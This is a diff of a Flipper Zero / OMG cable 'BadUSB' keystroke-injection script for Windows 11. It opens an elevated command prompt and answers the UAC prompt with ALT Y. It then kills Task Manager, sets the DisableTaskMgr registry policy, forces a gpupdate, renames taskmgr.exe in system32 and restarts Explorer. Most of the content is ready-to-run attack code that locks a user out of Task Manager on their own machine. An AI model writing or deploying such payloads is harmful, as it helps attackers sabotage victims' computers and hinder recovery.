@@ -3,19 +3,41 @@ REM Version 1.0 (Flipper Ducky / OMG Cable)
 REM Target: windows 11
 REM This badkb script attempts bypassing UAC and elevating privileges on a Windows system to disable Task Manager by modifying the Windows registry
 DELAY 1000
-REM Open the Run dialog
+REM --- Open Run Dialog ---
 WINDOWS r
 DELAY 500
-REM Execute the COM Elevation Moniker method to open an elevated Command Prompt
-STRING powershell -windowstyle hidden -command "Start-Process 'cmd.exe' -ArgumentList '/c start /b COMSPEC' -Verb RunAs"
+REM --- Step 1: Open Command Prompt with Admin Privileges ---
+STRING powershell Start-Process cmd -ArgumentList '/c start /b COMSPEC' -Verb RunAs
 ENTER
 DELAY 1000
-REM Ensure Command Prompt is running with elevated privileges
-REM Disable Task Manager by modifying the registry
-STRING powershell Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
+ALT Y
+DELAY 1000
+REM --- Step 2: Kill Task Manager if Running ---
+STRING taskkill /F /IM taskmgr.exe
 ENTER
 DELAY 500
-REM Close the PowerShell or Command Prompt window
+REM --- Step 3: Modify Group Policy and Registry to Disable Task Manager ---
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
+ENTER
+DELAY 500
+STRING gpupdate /force
+ENTER
+DELAY 1000
+REM --- Step 4: Rename the Task Manager Executable ---
+STRING rename %windir%\system32\taskmgr.exe taskmgr_disabled.exe
+ENTER
+DELAY 500
+REM --- Step 5: Close Command Prompt ---
 STRING exit
 ENTER
 DELAY 500
+REM --- Step 6: Restart Explorer to Apply Changes ---
+STRING taskkill /F /IM explorer.exe
+ENTER
+DELAY 1000
+STRING start explorer.exe
+ENTER
+DELAY 500
+REM --- Step 7: Exit PowerShell ---
+STRING exit
+ENTER
